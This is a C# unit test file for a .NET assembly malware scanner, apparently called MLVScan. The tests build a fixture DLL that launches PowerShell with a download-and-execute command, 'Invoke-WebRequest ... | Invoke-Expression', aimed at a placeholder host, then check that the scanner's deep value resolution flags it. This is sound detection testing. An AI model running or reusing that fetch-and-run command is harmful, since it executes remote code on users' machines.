using FluentAssertions;
using MLVScan.Models;
using MLVScan.Services;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Services;

public class DeepValueResolutionTests
{
    private const string Command = "Invoke-WebRequest https://example.invalid/payload | Invoke-Expression";

    [Theory]
    [InlineData(DeepScanMode.Disabled, false)]
    [InlineData(DeepScanMode.Always, true)]
    [InlineData(DeepScanMode.RetryOnIncomplete, true)]
    public void Scan_ProcessResolutionBudget_UsesRequestedMode(DeepScanMode mode, bool deep)
    {
        using var input = BuildFixture(false);
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules(), new ScanConfig { DeepScanMode = mode });
        var findings = scanner.Scan(input, "ValueResolution.dll").ToList();
        scanner.LastScanUsedDeepAnalysis.Should().Be(deep);
        findings.Any(f => f.RuleId == "ValueResolutionBudget").Should().Be(!deep);
        findings.Any(f => f.RuleId == "ProcessStartRule" && f.Description.Contains(Command)).Should().Be(deep);
    }

    [Theory]
    [InlineData(DeepScanMode.Disabled, false, 100)]
    [InlineData(DeepScanMode.RetryOnIncomplete, true, 100)]
    [InlineData(DeepScanMode.Disabled, false, 1)]
    [InlineData(DeepScanMode.RetryOnIncomplete, true, 1)]
    public void Scan_CatchHandlerReportsResolverLimitsAndCanRetry(DeepScanMode mode, bool deep, int findingBudget)
    {
        using var input = BuildFixture(false, inCatch: true);
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules(), new ScanConfig
        {
            DeepScanMode = mode, MaxExceptionHandlerFindingsPerMethod = findingBudget
        });
        var findings = scanner.Scan(input, "ValueResolution.dll").ToList();
        scanner.LastScanUsedDeepAnalysis.Should().Be(deep);
        findings.Any(f => f.RuleId == "ValueResolutionBudget").Should().Be(!deep);
        findings.Any(f => f.RuleId == "ProcessStartRule" && f.Description.Contains(Command)).Should().Be(deep);
    }

    [Fact]
    public void Scan_ProcessStartInfoUsesDeepResolverBudget()
    {
        using var input = BuildFixture(false, useStartInfo: true);
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules(), new ScanConfig { DeepScanMode = DeepScanMode.RetryOnIncomplete });
        var findings = scanner.Scan(input, "ValueResolution.dll").ToList();
        scanner.LastScanUsedDeepAnalysis.Should().BeTrue();
        findings.Should().NotContain(f => f.RuleId == "ValueResolutionBudget");
        findings.Should().Contain(f => f.RuleId == "ProcessStartRule" && f.Description.Contains(Command));
    }

    [Fact]
    public void Scan_DeepModeDoesNotChangeRulesSharedWithStandardScanner()
    {
        var rules = RuleFactory.CreateDefaultRules();
        var deep = new AssemblyScanner(rules, new ScanConfig { DeepScanMode = DeepScanMode.Always });
        using var deepInput = BuildFixture(false);
        deep.Scan(deepInput, "ValueResolution.dll").Should().NotContain(f => f.RuleId == "ValueResolutionBudget");
        var standard = new AssemblyScanner(rules, new ScanConfig());
        using var standardInput = BuildFixture(false);
        standard.Scan(standardInput, "ValueResolution.dll").Should().Contain(f => f.RuleId == "ValueResolutionBudget");
    }

    [Theory]
    [InlineData(DeepScanMode.Disabled, false)]
    [InlineData(DeepScanMode.Always, true)]
    public void Scan_AlternativeBudgetExpandsInDeepMode(DeepScanMode mode, bool deep)
    {
        using var input = BuildFixture(false, alternateReturns: true);
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules(), new ScanConfig { DeepScanMode = mode });
        var findings = scanner.Scan(input, "ValueResolution.dll").ToList();
        findings.Any(f => f.RuleId == "ValueResolutionBudget").Should().Be(!deep);
        findings.Any(f => f.RuleId == "ProcessStartRule" && f.Description.Contains(Command)).Should().Be(deep);
    }

    [Fact]
    public void Scan_DeepModeStillHasFiniteDepth_ReportsRemainingLimit()
    {
        using var input = BuildFixture(true);
        var scanner = new AssemblyScanner(RuleFactory.CreateDefaultRules(), new ScanConfig { DeepScanMode = DeepScanMode.Always });
        var findings = scanner.Scan(input, "ValueResolution.dll").ToList();
        scanner.LastScanUsedDeepAnalysis.Should().BeTrue();
        findings.Should().Contain(f => f.RuleId == "ValueResolutionBudget");
    }

    [Fact]
    public void DeepConfiguration_IncreasesResolverBudgetsWithoutMutatingSource()
    {
        var standard = new ScanConfig();
        var deep = ScanConfig.CreateDeepAnalysis(standard);
        standard.MaxValueResolutionWork.Should().Be(4096);
        deep.MaxValueResolutionWork.Should().Be(65536);
        deep.MaxValueResolutionDepth.Should().Be(64);
        deep.MaxValueResolutionAlternatives.Should().Be(128);
    }

    private static MemoryStream BuildFixture(bool deepChain, bool inCatch = false, bool useStartInfo = false,
        bool alternateReturns = false)
    {
        using var assembly = AssemblyDefinition.CreateAssembly(new AssemblyNameDefinition("ValueResolution", new Version(1, 0)), "ValueResolution", ModuleKind.Dll);
        var module = assembly.MainModule;
        var type = new TypeDefinition("Fixture", "Launch", TypeAttributes.Public, module.TypeSystem.Object);
        module.Types.Add(type);
        MethodDefinition? previous = null;
        for (var index = 0; index < (deepChain ? 40 : 1); index++)
        {
            var helper = new MethodDefinition("Command" + index, MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.String);
            type.Methods.Add(helper);
            var il = helper.Body.GetILProcessor();
            if (previous != null) il.Emit(OpCodes.Call, previous);
            else
            {
                if (alternateReturns)
                    for (var alternative = 0; alternative < 40; alternative++)
                    {
                        il.Emit(OpCodes.Ldstr, "--example-" + alternative);
                        il.Emit(OpCodes.Ret);
                    }
                else if (!deepChain)
                    for (var padding = 0; padding < 5000; padding++) il.Emit(OpCodes.Nop);
                il.Emit(OpCodes.Ldstr, Command);
            }
            il.Emit(OpCodes.Ret);
            previous = helper;
        }
        var run = new MethodDefinition("Run", MethodAttributes.Public | MethodAttributes.Static, module.TypeSystem.Void);
        type.Methods.Add(run);
        var body = run.Body.GetILProcessor();
        Instruction? handler = null;
        if (inCatch)
        {
            body.Emit(OpCodes.Ldnull);
            body.Emit(OpCodes.Throw);
            handler = Instruction.Create(OpCodes.Pop);
            body.Append(handler);
        }
        body.Emit(OpCodes.Ldstr, "powershell.exe");
        body.Emit(OpCodes.Call, previous!);
        if (useStartInfo)
        {
            body.Emit(OpCodes.Newobj, module.ImportReference(typeof(System.Diagnostics.ProcessStartInfo).GetConstructor([typeof(string), typeof(string)])!));
            body.Emit(OpCodes.Call, module.ImportReference(typeof(System.Diagnostics.Process).GetMethod("Start", [typeof(System.Diagnostics.ProcessStartInfo)])!));
        }
        else body.Emit(OpCodes.Call, module.ImportReference(typeof(System.Diagnostics.Process).GetMethod("Start", [typeof(string), typeof(string)])!));
        body.Emit(OpCodes.Pop);
        var exit = Instruction.Create(OpCodes.Ret);
        if (inCatch)
        {
            body.Emit(OpCodes.Leave, exit);
            run.Body.ExceptionHandlers.Add(new ExceptionHandler(ExceptionHandlerType.Catch)
            {
                CatchType = module.ImportReference(typeof(Exception)),
                TryStart = run.Body.Instructions[0], TryEnd = handler,
                HandlerStart = handler, HandlerEnd = exit
            });
        }
        body.Append(exit);
        var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        return stream;
    }
}
